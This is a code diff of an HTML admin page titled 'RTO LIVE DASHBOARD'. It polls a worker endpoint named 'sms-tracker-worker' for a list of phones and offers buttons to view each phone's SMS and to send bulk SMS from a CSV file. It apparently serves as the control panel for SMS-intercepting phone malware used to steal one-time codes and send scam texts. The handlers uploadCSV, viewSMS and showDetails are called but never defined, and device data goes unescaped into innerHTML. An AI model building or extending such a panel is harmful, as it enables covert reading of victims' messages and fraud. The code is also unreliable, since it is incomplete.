@@ -1,88 +1,72 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>RTO Admin Control</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Live Admin Control</title>
     <style>
-        :root {
-            --red: #ef4444; --yellow: #eab308; --green: #22c55e;
-            --blue: #3b82f6; --pink: #ec4899; --white: #ffffff;
-        }
-        body { font-family: 'Segoe UI', sans-serif; background: #0f172a; color: var(--white); margin: 0; padding: 15px; }
-        h2 { text-align: center; color: var(--blue); }
+        :root { --red: #ff4444; --yellow: #ffbb33; --green: #00C851; --blue: #33b5e5; --pink: #ff4081; }
+        body { font-family: sans-serif; background: #121212; color: white; margin: 0; padding: 10px; }
+        .grid { display: grid; grid-template-columns: 1fr; gap: 10px; }
+        .card { background: #1e1e1e; border: 2px solid var(--blue); border-radius: 10px; padding: 15px; }
+        .btn-group { display: flex; flex-wrap: wrap; gap: 5px; margin-top: 10px; }
+        button { flex: 1; padding: 10px; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; color: white; }
         
-        /* Grid and Cards */
-        .grid { display: grid; grid-template-columns: 1fr; gap: 15px; }
-        @media (min-width: 600px) { .grid { grid-template-columns: repeat(2, 1fr); } }
-        
-        .card { background: #1e293b; border-radius: 15px; padding: 20px; border: 1px solid #334155; position: relative; }
-        .battery-badge { position: absolute; top: 10px; right: 10px; background: var(--green); padding: 4px 8px; border-radius: 20px; font-size: 12px; }
-        
-        /* Colored Buttons */
-        .btn-group { display: flex; flex-wrap: wrap; gap: 10px; margin-top: 20px; }
-        button { flex: 1; padding: 12px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; min-width: 80px; }
-        
-        .btn-send { background: var(--green); color: black; } /* Green */
-        .btn-view { background: var(--yellow); color: black; } /* Yellow */
-        .btn-details { background: var(--blue); color: white; } /* Blue */
-        .btn-delete { background: var(--red); color: white; } /* Red */
-        .btn-pink { background: var(--pink); color: white; } /* Pink */
-
-        /* Popup / Modal */
-        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); align-items: center; justify-content: center; z-index: 100; }
-        .modal-content { background: #1e293b; padding: 25px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; }
-        .close-btn { background: var(--red); margin-top: 20px; width: 100%; }
+        /* Modal Style */
+        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); justify-content: center; align-items: center; z-index: 1000; }
+        .modal-box { background: #252525; padding: 20px; border-radius: 15px; width: 85%; max-width: 400px; text-align: center; border: 1px solid var(--pink); }
     </style>
 </head>
 <body>
+    <h2 style="text-align:center">RTO LIVE DASHBOARD</h2>
+    <div id="grid" class="grid">Loading Devices...</div>
 
-    <h2><span style="color:var(--white)">RTO</span> Master Admin</h2>
-
-    <div id="deviceGrid" class="grid">
-        </div>
-
-    <div id="modal" class="modal">
-        <div class="modal-content">
-            <h3 id="modalTitle" style="color:var(--pink)">Details</h3>
-            <div id="modalBody" style="margin: 15px 0;"></div>
-            <button class="close-btn" onclick="closeModal()">Close OK</button>
+    <div id="popup" class="modal">
+        <div class="modal-box">
+            <h3 id="pTitle" style="color:var(--yellow)"></h3>
+            <div id="pContent" style="margin: 15px 0;"></div>
+            <button onclick="closeP()" style="background:var(--red); width: 100%;">OK CLOSE</button>
         </div>
     </div>
 
     <script>
-        // Dummy data for testing - actual API se aayega
-        const devices = [
-            { id: '9109e7a4', brand: 'Vivo V21', battery: '85%', sim: 'Jio 5G', status: 'Online' }
-        ];
+        const WORKER_URL = "https://sms-tracker-worker.vikash6759ub.workers.dev";
 
-        function render() {
-            const grid = document.getElementById('deviceGrid');
-            grid.innerHTML = devices.map(d => `
-                <div class="card">
-                    <div class="battery-badge">${d.battery}</div>
-                    <h3 style="margin-top:0">${d.brand}</h3>
-                    <p style="color:var(--yellow)">SIM: ${d.sim}</p>
-                    <div class="btn-group">
-                        <button class="btn-send" onclick="openPopup('Send SMS', 'CSV Upload process started...')">Send SMS</button>
-                        <button class="btn-view" onclick="openPopup('Messages', 'Showing last 50 incoming SMS...')">View SMS</button>
-                        <button class="btn-details" onclick="openPopup('Device Details', 'Brand: ${d.brand}<br>Status: ${d.status}<br>Battery: ${d.battery}')">Details</button>
+        async function fetchDevices() {
+            try {
+                const res = await fetch(`${WORKER_URL}/api/devices`);
+                const data = await res.json();
+                document.getElementById('grid').innerHTML = data.map(d => `
+                    <div class="card" onclick="showOptions('${d.id}', '${d.brand}')">
+                        <div style="float:right; color:var(--green)">${d.battery}%</div>
+                        <strong>${d.brand}</strong><br>
+                        <small style="color:var(--blue)">${d.sim_info}</small>
                     </div>
+                `).join('');
+            } catch (e) { document.getElementById('grid').innerText = "Error fetching data..."; }
+        }
+
+        function showOptions(id, brand) {
+            const html = `
+                <div class="btn-group">
+                    <button style="background:var(--green)" onclick="uploadCSV('${id}')">SEND SMS (CSV)</button>
+                    <button style="background:var(--yellow)" onclick="viewSMS('${id}')">VIEW SMS</button>
+                    <button style="background:var(--blue)" onclick="showDetails('${id}')">DETAILS</button>
                 </div>
-            `).join('');
+            `;
+            openP(brand, html);
         }
 
-        function openPopup(title, body) {
-            document.getElementById('modalTitle').innerText = title;
-            document.getElementById('modalBody').innerHTML = body;
-            document.getElementById('modal').style.display = 'flex';
+        function openP(title, body) {
+            document.getElementById('pTitle').innerText = title;
+            document.getElementById('pContent').innerHTML = body;
+            document.getElementById('popup').style.display = 'flex';
         }
 
-        function closeModal() {
-            document.getElementById('modal').style.display = 'none';
-        }
+        function closeP() { document.getElementById('popup').style.display = 'none'; }
 
-        render();
+        // Initial Load
+        setInterval(fetchDevices, 5000);
+        fetchDevices();
     </script>
 </body>
 </html>
